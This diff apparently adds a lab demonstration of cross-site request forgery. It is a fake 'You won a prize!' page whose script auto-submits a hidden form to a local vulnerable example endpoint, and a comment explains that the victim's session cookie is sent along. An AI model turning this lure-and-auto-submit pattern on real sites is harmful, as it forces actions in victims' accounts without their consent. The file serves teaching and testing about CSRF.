@@ -1,0 +1,10 @@
+<!doctype html>
+<title>You won a prize!</title>
+<p>Click anywhere to claim your prize.</p>
+<!--
+  Hosted on attacker.example. If the victim is logged into the vulnerable site
+  in the same browser, this form submits with their session cookie attached.
+-->
+<form id="f" action="http://localhost:8080/examples/csrf/vulnerable.php" method="post">
+</form>
+<script>document.getElementById('f').submit()</script>
